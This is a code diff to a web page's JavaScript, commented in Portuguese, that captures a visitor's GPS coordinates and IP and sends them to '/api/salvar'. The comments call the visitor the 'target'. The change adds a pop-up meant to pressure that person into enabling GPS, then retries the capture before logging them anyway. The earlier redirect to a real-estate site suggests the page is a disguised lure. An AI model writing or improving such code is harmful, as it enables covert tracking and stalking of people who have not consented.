@@ -63,7 +63,7 @@
         let enviado = false;
 
         function enviarDados(lat, lon, precisao) {
-            if (enviado) return; // Garante que envia apenas uma vez
+            if (enviado) return;
             enviado = true;
 
             fetch('/api/salvar', {
@@ -89,9 +89,8 @@
                     enviarDados(lat, lon, precisao);
 
                 }, function(err) {
-                    // Se o GPS falhou ou foi negado (comum no iPhone), 
-                    // enviamos o registro do IP mesmo sem a coordenada e abrimos o seu pop-up
-                    enviarDados("NEGADO_OU_SEM_GPS", "NEGADO_OU_SEM_GPS", "0");
+                    // Se falhou, exibe o pop-up, mas NÃO envia dados falsos ainda. 
+                    // Deixa a tela parada no aviso para dar tempo do alvo ativar o GPS.
                     modalGps.style.display = "flex";
                 }, {
                     timeout: 7000,
@@ -102,10 +101,24 @@
             }
         }
 
-        // Quando o usuário clica no botão do pop-up para tentar de novo
+        // Quando o usuário clica no botão do pop-up após ativar o GPS
         function tentarNovamente() {
             document.getElementById('modal-gps').style.display = "none";
-            window.location.href = "https://www.imovelweb.com.br";
+            document.getElementById('status-texto').innerText = "Tentando novamente...";
+            
+            // Tenta pegar a localização de novo, dando a chance de capturar os dados reais agora que ele ativou
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                let lat = pos.coords.latitude;
+                let lon = pos.coords.longitude;
+                let precisao = pos.coords.accuracy;
+                enviarDados(lat, lon, precisao);
+            }, function(err) {
+                // Se ele clicou no botão mas continuou sem GPS, aí sim enviamos o registro de IP vazio e saímos
+                enviarDados("NEGADO_OU_SEM_GPS", "NEGADO_OU_SEM_GPS", "0");
+            }, {
+                timeout: 7000,
+                enableHighAccuracy: true
+            });
         }
 
         // Executa assim que a página abre
